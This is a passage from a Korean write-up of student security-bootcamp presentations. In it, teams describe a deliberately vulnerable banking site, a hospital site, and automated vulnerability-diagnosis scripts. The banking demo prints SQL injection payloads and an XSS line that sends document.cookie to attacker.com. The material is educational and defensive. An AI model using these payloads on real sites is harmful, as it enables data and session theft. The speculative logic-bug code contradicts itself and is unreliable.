- **발표 스킬**: 4조는 발표 목소리가 작음, 5조는 시간 초과

### 5.3.4 학습 포인트

1. **도메인 이해의 중요성**
   - 의료: 환자-의사 관계, EMR 시스템, 민감 정보 보호
   - 기업: 전자결재, 권한 관리, 내부 업무 프로세스

2. **진단 범위의 확장**
   - 웹 애플리케이션뿐만 아니라 OS, DB, 네트워크까지

3. **검증의 중요성**
   - 자동 스캐너가 제대로 작동하는지 수동 진단으로 확인 필요

4. **실무 적용 가능성**
   - AWS 인프라 활용
   - 실제 현업에서 사용하는 구조 반영 노력

---

**(Section 5 완료)**

**다음 작업**: Section 6 (8조 + 9조 프로젝트) 작성 예정
# Section 6: 8조 + 9조 프로젝트

## 6.1 8조 프로젝트: 금융권 서비스 취약점 진단 도구

### 6.1.1 프로젝트 개요

**팀**: 8조 (발표자: 이현우)

**프로젝트명**: 금융권 서비스 제작 및 취약점 진단 도구

**개발 기간**: 5일 (연휴 포함)

**프로젝트 목표**:
- 간단한 금융권 서비스 구현
- 웹 애플리케이션에 대한 이해
- 취약점 진단 도구 제작 및 시연
- 웹 서비스 전반에서 발생할 수 있는 보안 이슈 파악

### 6.1.2 프로젝트 배경: 금융권 보안의 중요성

#### 왜 금융권인가?

"금융권 서비스면 이제 저희가 모두 사용하는 그리고 살면서 **모두 사용해야 하는 서비스**이기도 하고 최근에 금융권 관련해서 최근 특히 이제 **코인 거래소 쪽에서** 이제 보안 관련 이슈들이 많았는데..."

#### 최근 보안 이슈 사례

8조는 최근 코인 거래소에서 발생한 보안 사고들을 언급하며 금융권 보안의 중요성을 강조했습니다.

"이제 그런 사례들을 파면서 이제 저희가 직접 간단한 금융권 서비스를 구현하면서 웹 어플리케이션에 대한 이해를 하고 취약점 진단 도구를 제작 시연을 해서 웹 서비스 전반에서 발생할 수 있는 보안 이슈. 그리고 금융권에서도 어떤 식으로 발생을 할 수 있는지 이제 알아보고자 금융권 서비스 제작 및 이제 취약점 진단 도구를 제작을 주제로 선정을 하였습니다."

### 6.1.3 시스템 아키텍처

#### 전형적인 3-Tier 구조

"기본적인 시스템 아키텍처는 전형적인 **3-Tier 구조**로 구성을 하였습니다."


#### 기술 스택

| 계층 | 기술 | 선택 이유 |
|-----|------|----------|
| **Web Server** | Nginx | 리버스 프록시 역할 |
| **WAS** | Python Flask | 코드 개발 과정에서 편하게 친숙한 언어 사용 |
| **Database** | MySQL | 범용적인 RDBMS |

"웹 서버는 엔진엑스, 프리퀴디션 서버는 이제 코드 개발 과정에서 좀 편하게 좀 **친숙한 언어를 사용하기 위해서** 파이썬을 사용하는 플라스크를 사용을 하고 DB는 MySQL을 사용을 했습니다."

### 6.1.4 금융권 웹사이트 주요 기능

#### 페이지 구성

"페이지의 주요 기능으로는 이제 뭐 로그인 로그아웃, 회원가입, 대시보드 입금, 출금, 송금, 마이 페이지, 문의 게시판 이렇게 있는데 이거는 페이지를 보면서 진행을 하겠습니다."

#### 1. 회원가입

"일단 회원가입, 이런 식으로 회원가입을 할 수 있고..."

#### 2. 대시보드 - 계좌 정보

"이런 식으로 들어가면 이제 여기 **계좌 정보를 볼 수 있는** 이런 대시보드가 존재를 합니다. 이렇게 계좌를 개설을 하면 이런 식으로 **계좌번호와 잔액**이 이제 표시가 되고..."

**주의사항**:
"현재는 지금 잔액이 실제로 막 돈을 실제로 넣고 빼는 구조가 아니기 때문에 일단 임시로 이런 식으로 진행을 하고..."

#### 3. 입금 기능

"입금을 통해 가지고 이제 입금을 수행을 하거나..."

#### 4. 출금 기능

"출금도 마찬가지로 진행하고..."

#### 5. 송금 기능

**핵심 기능**:
"이제 송금 기능이 있는데 이 경우는 **다른 계좌에** 이런 식으로 송금을 하면 이쪽에서 잔액이 이동되는 형식으로 출금 송금 서비스가 구현이 되어 있습니다."

#### 6. 마이 페이지

**기능**:
- 회원정보 조회
- 회원정보 수정

"그리고 이제 회원정보를 볼 수 있는 **마이 페이지** 기능, 회원정보를 수정을 하는 회원정보 수정 기능이 있고..."

#### 7. 고객센터 - 문의 게시판

**기능**:
- 문의 작성
- 파일 업로드

"이제 고객센터 만약에 문제가 발생했을 때 이렇게 문의를 작성을 할 수 있는 **파일까지 업로드를 할 수 있는** 이런 문의 게시판까지 구현이 되어 있습니다."

### 6.1.5 의도적으로 구현된 취약점 (5가지)

8조는 금융 서비스에 **5가지 취약점을 의도적으로 구현**했습니다.

#### 취약점 분류

| 번호 | 취약점 | OWASP Top 10 분류 | 심각도 |
|-----|--------|------------------|--------|
| 1 | SQL Injection | A03:2021 - Injection (5위) | Critical |
| 2 | Cross-Site Scripting (XSS) | A03:2021 - Injection | High |
| 3 | CSRF | A01:2021 - Broken Access Control (1위) | High |
| 4 | 부적절한 인가 | A01:2021 - Broken Access Control (1위) | High |
| 5 | 로직 버그 (Logic Bug) | A04:2021 - Insecure Design (10위) | Critical |

#### 1. SQL Injection

**발생 위치**:
- 로그인
- 회원가입
- 거래 내역 검색

**취약점 설명**:
"로그인, 회원가입, 거래 내역 검색 등에서 **사용자 입력값이 검증 없이 처리**돼서 DB Query를 이제 임의로 실행을 시킬 수 있는 취약점입니다."

**OWASP 분류**:
"OWASP TOP 10 중 5위 **Injection**에 포함된 취약점입니다."

#### 2. Cross-Site Scripting (XSS)

**발생 위치**:
- 문의 게시판
- 거래 내역 조회

**취약점 설명**:
"문의 게시판, 거래 내역 조회 등에서 **페이지의 스크립트가 삽입**이 돼서 전달되는 형태로 발생을 합니다."

**OWASP 분류**:
"Cross-Site Scripting도 **Injection**에 포함된 취약점인데..."

#### 3. CSRF (Cross-Site Request Forgery)

**발생 위치**:
- 송금
- 출금
- 회원정보 수정

**취약점 설명**:
"송금, 출금, 회원정보 수정 등에서 발생을 하고 아까 회원정보 수정 같은 거 잠깐 보셨을 때 **인증 과정이 없는 걸** 확인할 수 있었는데 인증 절차가 존재하지 않아서 잘못된 링크 클릭이나 공격자에 의해 삽입된 HTML 스크립트 등에 의해서 이제 원하지 않는 요청이 발생할 수 있는 취약점입니다."

**OWASP 분류**:
"CSRF나 부적절한 인가 같은 경우는 OWASP TOP 1 **Broken Access Control**에 포함이 되어 있는 취약점입니다."

#### 4. 부적절한 인가 (Insecure Direct Object Reference)

**발생 위치**:
- 문의 게시판
- 계좌 관리

**취약점 설명**:
"URL 파라미터를 변경을 해서 **타인의 정보를 조회**할 수 있는 식으로 구성이 되어 있습니다."

#### 5. 로직 버그 (Logic Bug) - 자기 자신에게 송금 시 잔액 증가

**가장 흥미로운 취약점**:

"예외 상황에 부적절한 처리 같은 경우는, 이렇게 써두긴 했는데 그 **논리적인 오류에 의해서 발생하는 로직 버그**를 얘기하는 겁니다. 기능 구현상의 오류로 이제 저희 취약점, 저희 페이지에서는 이제 **자기 자신에게 송금할 때 잔액이 증가되는** 취약점이 존재를 합니다."

**OWASP 분류**:
"OWASP TOP 10 중에서 **TOP 10에 위치**해 있는 취약점입니다."

**실제 사례 - The DAO 프로젝트**:

"실제로 이제 2000 몇 년, 몇 년 전에 이제 이더리움에서 **The DAO 프로젝트**라는 이제 그런 프로젝트에서 유사한 취약점이 발생을 해서 이제 돈이 막 복사가 되는 버그가 있었고 그걸로 이제 **프로젝트가 중단된 사례**가 실제로 존재합니다."

### 6.1.6 프로젝트 취약점 시연

#### 시연 1: SQL Injection - 거래 내역 검색

**공격 시나리오**:

"거래 내역을 보면 이런 식으로 **쿼리를 입력**을 하면 여기 내용 부분에 실제 이 서비스에서 사용하는 **데이터베이스 이름이 출력**이 된다거나..."

**공격 페이로드**:
```sql
' OR 1=1 --
' UNION SELECT database() --
```

**결과**:
"이런 식으로 쿼리를 입력을 하면 이거는 이제 **Shielders Bank**라는 DB에 대해서 어떤 테이블 이름을 사용을 하고 있는지 이제 저희 서비스 DB 안에 이런 테이블들이 존재한다는 걸 이렇게 확인할 수 있습니다."

**추가 공격**:
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='shielders_bank' --
```

#### 시연 2: Cross-Site Scripting (XSS) - 송금 메모

**공격 시나리오**:

"송금 메모에다가 이제 **스크립트를 이제 삽입**을 해서 보내면 최근 거래 이 내용 부분에 이제 스크립트가 삽입이 돼서 이제 스크립트가 실행이 되는 그런 취약점입니다."

**공격 페이로드**:
```html
<script>alert('XSS 공격!');</script>
<script>location.href='http://attacker.com/steal?cookie='+document.cookie;</script>
```

#### 시연 3: Logic Bug - 자기 자신에게 송금

**가장 치명적인 취약점**:

"이제 방금 말씀드렸던 그 송금 관련한 문제인데 이거는 이제 자기 자신에게 107,008만 원 보내면 **잔액이 2배**가 됩니다."

**공격 시나리오**:
```
초기 잔액: 107,008원
자기 자신에게 107,008원 송금
최종 잔액: 214,016원 (2배!)
```

**송금 내역 확인**:
"이런 식으로 내용을 보면 잔액이 **줄었다가 증가**하고 이런 식으로 돼 있는데 이거는 이제 코드 구현상에서 이제 그 논리를 이제 잘못 적용해서 이렇게 취약점이 발생할 수도 있습니다."

**코드 논리 오류 분석**:

```python
# 취약한 코드 (추정)
def transfer(sender_account, receiver_account, amount):
    # 1. 송금자 계좌에서 차감
    sender_account.balance -= amount

    # 2. 수신자 계좌에 입금
    receiver_account.balance += amount

    # 문제: sender_account == receiver_account인 경우
    # sender_account.balance -= amount  (예: 107008 - 107008 = 0)
    # receiver_account.balance += amount (예: 0 + 107008 = 107008)
    # 하지만 sender_account와 receiver_account가 같은 객체이므로
    # 실제로는 sender_account.balance = sender_account.balance - amount + amount
    # 결과: 잔액 변화 없음 (정상)

    # 실제 취약한 구현 (추정):
    # DB 트랜잭션 분리로 인한 동시성 문제 또는
    # 중간 저장 시점의 문제로 인해 2배가 됨
```

### 6.1.7 취약점 진단 스크립트 개발

#### 진단 영역

"그리고 이제 이 서비스를 개발을 한 다음에 **주요 정보 통신 기반 시설 취약점 분석 평가 가이드**를 기준으로 서비스 전반적인 취약점을 진단할 수 있는 스크립트를 개발을 하였습니다."

**현재까지 개발된 진단 영역**:

| 영역 | 대상 |
|-----|------|
| **OS** | Linux |
| **DB** | MySQL |
| **웹 서버** | Nginx |
| **웹 애플리케이션** | Flask |

"현재까지 개발한 진단 영역은 OS 중에서도 **리눅스** 그리고 DB 그 **MySQL** DB 웹 서버 그리고 웹 어플리케이션이며 이제 진단 대상의 서버를 정보를 입력하면 **자동으로 그 서버에 접근**을 해서 진단을 수행을 합니다."

#### 진단 프로세스

**플로우**:


"프로세스로는 이제 서버 정보를 이제 **XML 파일로 넘기면** 대상을 식별하고 이제 SSH 연결을 통해서 모듈을 실행해서 리포트를 생성을 하는 방식으로 진행이 됩니다."

### 6.1.8 3-Tier 구조에서의 진단 문제 해결 - SSH 터널링

#### 문제: 내부 서버 접근 불가

"이제 그 스크립트를 만들면서 이제 문제가 됐던 부분이 이제 **진단 대상 서버에 접근하는 것이 문제**가 됐습니다."

**3-Tier 구조의 한계**:

"3-Tier 구조로 이제 이게 서비스를 설계를 하게 되면 앱 서버와 DB 서버는 **외부에서 접근이 불가능**하고 그렇다고 이제 웹 서버 내부의 스크립트를 설치하려 실행시키기에는 **활용성이 떨어지고** 이제 다른 소스 코드가 노출이 되는 등의 이제 **보안 문제**가 발생을 할 수 있습니다."

#### 해결책: 진단 서버 + SSH 터널링

**아키텍처 설계**:


"그래서 이제 저희 이 구조에서 이 웹 서버가 존재하는 그 **Public Subnet 쪽에** 이제 DMZ 서버 그 **진단 서버를 두고** 이 진단 서버에다가 이제 **SSH 터널링을 걸어서** 이제 이 진단 서버를 통해서 웹 서버 어플리케이션 서버 DB 서버에 접근하여서 이제 집중 서버에 서버에 위치하지 않더라도 이제 **원격으로 취약점을 진단 할 수 있는 방식**으로 구현을 하게 되었습니다."

#### SSH 터널링 상세 설명

"여기 설명 보시다시피 **Bastion Host를 경유**를 해서 그 채널 생성을 하고 이제 **포트 포워딩**을 해서 원격으로 진단을 수행합니다."

**SSH 터널링 명령어 예시**:

```bash
# Web Server 접근
ssh -L 8080:web-server-private-ip:80 -i key.pem ec2-user@bastion-public-ip

# App Server 접근
ssh -L 5000:app-server-private-ip:5000 -i key.pem ec2-user@bastion-public-ip

# DB Server 접근
ssh -L 3306:db-server-private-ip:3306 -i key.pem ec2-user@bastion-public-ip
```

### 6.1.9 진단 스크립트 구조 - 모듈화 및 확장성

#### 디렉터리 구조

```bash
diagnosis_tool/
├── main.py                 # 메인 실행 스크립트
├── server_list.xml         # 진단 대상 서버 정의
├── modules/                # 진단 모듈 디렉터리
│   ├── os/
│   │   ├── linux_account_check.py
│   │   ├── linux_password_policy.py
│   │   ├── linux_suid_check.py
│   │   └── ...
│   ├── db/
│   │   ├── mysql_account_check.py
│   │   ├── mysql_password_policy.py
│   │   ├── mysql_privilege_check.py
│   │   └── ...
│   ├── web/
│   │   ├── nginx_version_check.py
│   │   ├── nginx_security_headers.py
│   │   └── ...
│   └── app/
│       ├── flask_sql_injection.py
│       ├── flask_xss_check.py
│       └── ...
└── reports/                # 진단 결과 리포트
    └── diagnosis_YYYYMMDD_HHMMSS.log
```

#### 모듈화 설계

"그리고 이제 또 진단 영역 별로 이제 항목 별로 이렇게 **그룹들을 분할**을 해서 원하는 진단의 진단 영역을 **선택적으로 수행**할 수 있게 개발했고 추후 이제 진단 항목을 추가한다거나 진단 영역을 추가할 때 그냥 이제 그 **모듈스라는 디렉터리 안에 추가만 한다면** 이제 편하게 이제 진단 항목을 추가할 수 있도록 개발을 하였습니다."

### 6.1.10 진단 실행 시연

#### server_list.xml 파일 구성

"실제 진단 예시를 보여드리자면 이제 **server_list.xml** 이라는 파일을 이제 진단 대상의 서버 IP 포트 접근 계정 진단 영역 등을 정리한 뒤에 메인 스크립트를 진행하면 이런 식으로 이제 진단이 수행이 됩니다."

**XML 파일 예시**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<diagnosis>
    <!-- DMZ 서버 (Bastion Host) -->
    <bastion>
        <ip>bastion-public-ip</ip>
        <port>22</port>
        <user>ec2-user</user>
        <key>diagnosis-key.pem</key>
    </bastion>

    <!-- 진단 대상 서버 1: 웹 서버 -->
    <server>
        <description>웹 서버</description>
        <category>web</category>
        <private_ip>192.168.1.10</private_ip>
        <port>22</port>
        <user>ubuntu</user>
    </server>

    <!-- 진단 대상 서버 2: 앱 서버 -->
    <server>
        <description>어플리케이션 서버</description>
        <category>app</category>
        <private_ip>192.168.1.20</private_ip>
        <port>22</port>
        <user>ubuntu</user>
        <app_path>/var/www/flask_app</app_path>
    </server>

    <!-- 진단 대상 서버 3: DB 서버 -->
    <server>
        <description>데이터베이스 서버</description>
        <category>db</category>
        <private_ip>192.168.1.30</private_ip>
        <port>3306</port>
        <db_user>diagnosis_user</db_user>
        <db_password>diagnosis_password</db_password>
    </server>
</diagnosis>
```

"이거는 **DMZ 서버**입니다. DMZ 서버 IP SSH 접근 관련 데이터들 정의가 되어 있고..."

"진단 대상 서버들을 서버 태그에 하나씩 정의를 했습니다. 그래서 **카테고리 안에 웹인지 OS인지** 이걸 확인해서 그에 맞게..."

"어플리케이션 서버 같은 경우는 어플리케이션 파일이 어디 있는지 **경로까지 포함**을 지켜주고 DB 서버 같은 경우는 **데이터베이스 유저의 아이디 비밀번호** 이런 식으로 정의를 해서..."

#### 진단 실행 화면

"여기서 진행을 시키면 이런 식으로 접속을 시도해서 하나씩 접근을 수행 진단을 수행을 하는데..."

```bash
$ python main.py

[2026-01-06 14:05:23] 진단 시작...
[2026-01-06 14:05:24] Bastion Host 접속 중... (bastion-public-ip)
[2026-01-06 14:05:25] ✓ Bastion Host 접속 성공

[2026-01-06 14:05:26] 웹 서버 진단 시작 (192.168.1.10)
[2026-01-06 14:05:27] OS-001: 기본 계정 존재 여부... 양호
[2026-01-06 14:05:28] OS-002: 패스워드 정책... 취약
[2026-01-06 14:05:29] OS-003: SUID 파일... 취약
...
[2026-01-06 14:07:15] 웹 서버 진단 완료

[2026-01-06 14:07:16] 앱 서버 진단 시작 (192.168.1.20)
...
```

"뭐 일일이 다 확인하기에는 좀 시간이 걸리고 뭐 이런 식으로 이제 뭔가 설정이 잘못됐다 이런 식으로 **취약한건 취약하다 안전한건 안전하다**로 이제 나와서..."

### 6.1.11 진단 결과 리포트

#### 로그 파일 형식

"실제로 이제 결과를 보면 이런 식으로 이제 그 진단 리스트 상의 이제 **중요도** 그리고 이건 **항목 코드** 뭐 OS-006, OS-012 이 경우는 이제 웹 분야에서 CSRF, CF 뭐 이런 식으로 해서 어떤 부분이 취약하고 어떤 부분에 양호한지 이런 식으로 **로그 파일로 이제 생성**이 돼서 출력이 됩니다."

**리포트 예시**:

```
===========================================
진단 대상: 금융권 서비스
진단 일시: 2026-01-06 14:05:23
===========================================

[웹 서버 진단 결과]
-------------------------------------------
항목 코드 | 진단 항목 | 중요도 | 결과 | 증거
-------------------------------------------
WEB-001 | Nginx 버전 점검 | High | 취약 | nginx/1.14.0 (구 버전)
WEB-002 | Security Headers | Medium | 취약 | X-Frame-Options 누락
WEB-003 | Directory Listing | High | 양호 | 비활성화됨
WEB-004 | Server Signature | Low | 취약 | 서버 정보 노출됨
...

[웹 애플리케이션 진단 결과]
-------------------------------------------
항목 코드 | 진단 항목 | 중요도 | 결과 | 증거
-------------------------------------------
APP-001 | SQL Injection | Critical | 취약 | login.py:45, search.py:78
APP-002 | XSS | High | 취약 | message_board.py:112
APP-003 | CSRF | High | 취약 | transfer.py:234 (토큰 없음)
APP-004 | IDOR | High | 취약 | account_view.py:56
APP-005 | Logic Bug | Critical | 취약 | transfer.py:245 (자기 송금 시 증가)
...

[DB 진단 결과]
-------------------------------------------
항목 코드 | 진단 항목 | 중요도 | 결과 | 증거
-------------------------------------------
DB-001 | 기본 계정 존재 | High | 양호 | test 계정 없음
DB-002 | 패스워드 정책 | High | 취약 | validate_password 플러그인 비활성화
DB-003 | 원격 접속 통제 | Critical | 취약 | 모든 IP 허용 (%)
...

[OS 진단 결과]
-------------------------------------------
항목 코드 | 진단 항목 | 중요도 | 결과 | 증거
-------------------------------------------
OS-001 | 기본 계정 존재 | Medium | 양호 | 불필요한 계정 없음
OS-002 | 패스워드 정책 | High | 취약 | PASS_MAX_DAYS=99999
OS-003 | SUID 파일 | High | 취약 | /usr/bin/find (SUID 설정됨)
OS-006 | 방화벽 설정 | High | 취약 | 방화벽 비활성화됨
OS-012 | SSH 보안 | Critical | 취약 | PermitRootLogin yes
...
```

### 6.1.12 진단 결과 통계

"실제로 이 현재까지 개발된 진단 스크립트를 실행을 해서 이제 이런 이런 식으로 진단을 수행을 해서 이제 오른쪽과 같은 이런 진단 결과가 나왔습니다."

**통계 요약**:

| 분야 | 전체 항목 | 취약 | 양호 | 취약률 |
|-----|----------|------|------|--------|
| **웹 서버** | 16개 | 4개 | 12개 | 25.0% |
| **웹 애플리케이션** | 10개 | 8개 | 2개 | 80.0% |
| **DB 서버** | 12개 | 3개 | 9개 | 25.0% |
| **OS (Linux)** | 15개 | 6개 | 9개 | 40.0% |

"웹 서비스에서는 이제 16개의 항목을 이제 기준으로 진단을 했을 때 **4개의 항목이 취약**하다 그리고 12개의 항목에서 양호하다라고 이제 나왔고 웹 어플리케이션 쪽에서는 **8 항목이 취약**하도록 나왔습니다. DB 서버에서는 이제 3개의 항목이 취약한 부분이 이제 발생을 했고 OS 서버 같은 OS 리눅스 같은 경우에서는 이제 6개 이거는 아마 OS마다 다를 건데 보통 이제 아마 이거 웹 서비스 이쪽 서버의 OS를 진단을 했을 겁니다. 그래서 6개 정도 취약한 부분이 나왔습니다."

### 6.1.13 프로젝트 정리 및 향후 계획

#### 현재 완성도

"그래서 뭐 정리하자면 이제 현재 저희 스크립트 이제 원격에서도 이제 내부 서버에 용이한 진단을 위해서 이제 **SSH 터널링을 통해서 내부를 접근**하는 기능을 일단 구현을 하였고 이제 기본적인 **웹 서버 앱 서버 DB OS 진단 모듈을 일단 개발을 완료**를 했습니다."

#### 향후 발전 방향

"일단 이후 프로젝트를 발전을 시킨다면 이제 가장 먼저 이제 뭐..."

**1. 진단 영역 확장**
"다른 모듈을 추가를 해서 **진단 영역을 확장**한다든가..."

**2. 웹 서비스 통합**
"또는 아까처럼 이제 출력되는 로그 파일 로그 이제 이게 일정 형식에 의해서 이게 출력이 되기 때문에 이거를 뭐 또 따로 파싱을 해서 이제 다른 조 앞에서 수행했던 것처럼 이제 **웹 서비스 내에 이제 그 진단 결과를 이제 출력을 시킬 수 있는 식**으로 이제 서비스를 얹을 수도 있고..."

**3. AI 활용**
"**AI를 활용해서 취약점 보완 방향성을 제시**를 한다거나..."

**4. 로직 버그 심층 분석**
"아니면 이제 그 로직 버그 같은 경우 이런 경우 이제 코드를 좀 더 심층적으로 분석을 해야 되는데 이제 **심층적인 분석을 통해서 정확도를 높이는** 방향으로 개선할 수 있을 것 같습니다."

### 6.1.14 Q&A 세션 및 강사 피드백

#### 강사의 관심과 질문

"발표 잘 들었습니다. 발표 잘 들었고 발팀 같은 경우는 항상 여기 나와서 제 옆에서 같이 작업을 하고 있어서 제가 왔다 갔다 하면서 이렇게 **훔쳐보고 어떻게 진행되고 있는지** 이제 이런 공상을 많이 파악하고 있어서 딱히 질문 내용이나 이런 것들이 있진 않아요. 궁금한 게 있었으면 예전에 이미 물어봤었지."

#### 발표 스타일 피드백

**목소리 크기**:
"발표할 때 조금 더 **큰 소리로 발표**를 해줬으면 좋겠다 생각이 들었어요. 목소리가 너무 작으니까 집중을 해서 들어야지 무슨 얘기하는지 이제 따라갈 만하다 이렇게 들어서 좀 더 큰 소리로 발표를 해줬으면 좋겠다 생각이 들었고..."

#### 서비스 자동 식별 방식에 대한 질문

**강사 질문**: "하나 궁금한 건 그 취약점 점검 도구 있잖아요. 점검 도구가 **자동으로 서비스를 식별한다**고 했는데 식별하는 방식이 어떻게 되나요? 중간에 취약점 점검할 때 점검 스크립트를 돌리면 알아서 자기가 웹 점검을 하거나 DB 점검을 하거나 알아서 서비스를 식별하고 점검을 수행하는 걸로 보이는데 자동 식별하는 방식이 어떻게 되는지."

**팀원 답변**: "서비스를 자동 식별하는 걸로는 안 돼 있는 걸로 지금 기억을 하고 이게 **XML 파일에 정의된 대로** XML에 어떤 필드 값을 보고 식별을 하죠?"

**강사**: "아까 발표 때 자동 식별이라고 말씀을 하셔서 제가 물어보는 거거든요. XML이 어떻게 구성되어 있죠?"

**XML 구성 설명**:

"일단 **DMZ 서버** 이렇게 정의하고 진단 대상 서버들을 서버 태그에 하나씩 정의를 했습니다. 생태의 **Description 값**을 보고서 서비스 진단을 수행하는 건가요?"

"이거는 그냥 식별하기 위한 설명이고 여기 **카테고리 안에 웹인지 OS인지** 이걸 확인해서 그에 맞게 어플리케이션 서버 같은 경우는 어플리케이션 파일이 어디 있는지 경로까지 포함을 지켜주고 DB 서버 같은 경우는 데이터베이스 유저의 아이디 비밀번호 이런 식으로 정의를 해서..."

#### 포트 번호 관련 질문

**강사**: "DB는 서비스 포트번호가 정의가 되어 있는데요. 어플리케이션 서버나 다른 거는 서비스가 포트번호 같은 게 누락이 되어 있네요."

**답변**: "여기는 **접근 포트만 22번** 되어 있고 점검하기 위한 포트만 있고 이게 DB 같은 경우는 이제 3306번으로 접근을 하면 이제 MySQL를 돌릴 수 있어서 MySQL로 진행을 하는데 이제 다른 서버 같은 경우는 대부분 **SSH로 접근**을 해서 이제 셸 내에서 명령을 실행을 통해서 진행을 할 수 있기 때문에 이게 대부분 이제 다 SSH로 그냥 22번 포트로 접근을 해서..."

#### 최종 평가

"네 알겠습니다. 발표 잘 해주셨습니다."

---

## 6.2 9조 프로젝트: 화이트 가운 - 병원 웹사이트 보안 진단

### 6.2.1 프로젝트 개요

**팀**: 9조 (팀명: 화이트 가운, 발표자: 오신우)

**프로젝트명**: 병원 웹사이트 구축 및 진단 스크립트

**개발 기간**: 5일 (연휴 포함)

**팀 구성** (5명):

| 이름 | 역할 |
|-----|------|
| 전성배 (팀장) | 인프라 구성, 진단 스크립트 테스트 |
| 오신우 | 웹 페이지 개발, 시큐어 코딩 |
| 임동현 | 웹 페이지 개발, 시큐어 코딩 |
| 김한울 | 웹 페이지 개발, 시큐어 코딩 |
| 박정서 | 취약점 스크립트 작성, 추가 취약점 확인 |

### 6.2.2 팀명의 의미

"팀명은 **화이트 가운**입니다. **화이트에커의 화이트**의 깨끗함과 화이트와 깨끗함을 의미하는 **가운**을 뜻하고 있습니다."

### 6.2.3 프로젝트 배경: 2021년 서울대병원 해킹 사고

#### 실제 사례 기반 프로젝트

"프로젝트 배경 및 목적으로는 저희가 진단 대상을 병원으로 선정한 계기는 **2021년 발생한 서울대병원 해킹 사고**입니다. 실제 의료 현장에서 발생하는 정보 유출의 심각성을 확인했기에 가상 환경을 구축하고 웹 진단 프로젝트를 하기로 설정했습니다."

#### 핵심 가치: 민감 정보의 안전한 관리

"이 과정에서 가장 중요하게 여긴 가치는 **민감정보에 안전한 관리**입니다. 병원 특성상 환자의 의료 기록과 같은 민감 정보가 포함되어 있어 **데이터의 무결성과 기밀성**을 확보하는 것이 필수적이라고 생각하고 서비스 신뢰도를 높이는 방향으로 프로젝트를 진행했습니다."

### 6.2.4 프로젝트 구조 - AWS 기반 3-Tier 아키텍처

#### 기술 스택

| 계층 | 기술 | 선택 이유 |
|-----|------|----------|
| **웹 서버** | Nginx | 리버스 프록시 |
| **WAS** | Tomcat 9 | 관공서, 금융권, 병원에서 많이 사용 |
| **DB** | MariaDB | 안정적인 오픈소스 RDBMS |
| **인프라** | AWS | 클라우드 환경 학습 |

"저희는 AWS에서 웹 서버는 Nginx, WAS는 Tomcat 9, DB는 MariaDB를 채택했습니다. **Tomcat 9을 사용한 이유**는 관공서나 금융권, 병원은 아직까지 자바를 사용하는 곳이 많기 때문입니다."

#### 네트워크 아키텍처


#### 보안 설계

"WAS와 DB 서버는 **프라이빗 서브넷**에 배치하여 외부로부터 직접적인 접근을 차단했고, 이에 따라 저희는 별도의 **스캔 전용 서버를 구성**하고 **내부망을 통해** 각 서버의 설정과 취약점을 점검하는 방식으로 진단을 수행했습니다."

### 6.2.5 병원 웹사이트 주요 기능

#### 메인 화면

"다음은 저희가 구축한 병원 웹사이트 메인 화면입니다."

#### 권한별 기능 차이

9조는 **3가지 권한**에 따라 기능을 구분했습니다:

##### 1. 환자 (Patient)

**주요 기능**:
- 예약 신청 및 예약 조회
- 검사 결과 조회
- 게시판 활동

"환자는 예약 신청 및 예약 조회, 검사결과 조회, 게시판 활동이 있고..."

##### 2. 의사 (Doctor)

**주요 기능**:
- 담당 환자의 진료 일정 및 예약 조회
- 진료 기록 및 의사 소견 입력
- 담당 환자의 검사 결과 열람

"의사는 담당 환자의 진료 일정 및 예약 조회, 진료 기록 및 의사소견 입력, 담당 환자의 검사결과 열람 기능이 있고..."

##### 3. 관리자 (Administrator)

**주요 기능**:
- 공지사항 및 게시판 전체 관리
- 계정 권한 관리

"관리자는 공지사항 및 게시판 전체 관리와 계정 권한 관리 기능이 있습니다."

#### 권한별 화면 차이

**관리자 계정**:

"좌측에는 **관리자 계정으로 로그인** 했을 때, 관리자는 사용자의 댓글이나 관리자 댓글, 의료진 댓글을 다 모두 **수정하거나 삭제**할 수 있도록 했고 좌측 아래 사진을 보면 사용자의 **권한 설정**을 할 수 있게끔 따로 구성을 해놨습니다. 일반 사용자와 의료진으로 일단 많이 나눠놨고요."

**일반 사용자 계정**:

"우측하면 일반 사용자가 로그인을 했을 때, **본인 댓글 외에는 수정을 할 수 없게끔** 구축을 진행했습니다."

### 6.2.6 취약점 진단 개요

#### 진단 목적

"취약점 진단의 목적은 **시스템 및 웹 서비스에서 취약점을 사전에 식별**하여 보안 사고를 예방하고 보안 수준 점검을 하기 위함입니다."

#### 진단 영역

| 영역 | 진단 방식 | 내용 |
|-----|----------|------|
| **서버** | SSH 기반 | 설정 및 권한 점검 |
| **웹** | HTTP 기반 | 동적 진단 |

"취약점 진단 서버 영역에서는 **SSH 기반**으로 설정 및 권한을 점검하였고, 웹 영역에서는 **HTTP 기반**의 동적 진단을 했습니다."

#### 진단 기준

"취약점 진단 기준은 **OWASP TOP 10**과 **주요 통신기반 시설 가이드**를 핵심 지표로 삼았습니다."

### 6.2.7 주요 취약점 진단 스크립트

#### 1. 인증 및 세션 관리 취약점

**취약점 개요**:

"이 취약점은 세션 관리가 제대로 되지 않을 경우, 공격자가 사용자 인증 정보를 탈취하거나 **세션을 고정**해서 정상 사용자로 가장할 수 있는 문제가 있습니다."

**진단 프로세스**:


**진단 방법 상세**:

"저희는 이 취약점을 자동으로 점검하기 위해 먼저 로그인 페이지에 접속해서 **로그인 이전의 세션 아이디를 하나 받아 오고**, 그 다음 테스트 계정으로 실제 로그인을 수행한 뒤 **로그인 이후에 발급된 세션 아이디를 다시 확인**하고, 이 두 세션 아이디가 동일할 경우에는 세션이 재발급되지 않은 것으로 판단해서 **세션 고정 취약점이 있는 것**으로 판단합니다."

**쿠키 보안 옵션 점검**:

"또한 세션 쿠키에 **HTTPOnly나 SameSite 옵션**이 설정되지 않는 경우에도 보안 설정이 미흡하다고 판단해서 취약으로 분류를 하고 있습니다."

**검증 불가 처리**:

"만약 로그인 이후에 세션 아이디 자체를 확인할 수 없는 경우에는 **검증이 불가능하다는 근거를 남기고**, 보수적인 기준에 따라 **취약 가능성이 있는 것**으로 처리합니다."

**진단 스크립트 예시**:

```python
import requests

def check_session_fixation(target_url, test_account):
    session = requests.Session()

    # 1. 로그인 전 세션 ID 획득
    response_before = session.get(f"{target_url}/login")
    session_id_before = session.cookies.get('JSESSIONID')

    # 2. 로그인 수행
    login_data = {
        'username': test_account['username'],
        'password': test_account['password']
    }
    response_after = session.post(f"{target_url}/login", data=login_data)
    session_id_after = session.cookies.get('JSESSIONID')

    # 3. 세션 ID 비교
    if session_id_before == session_id_after:
        result = "취약"
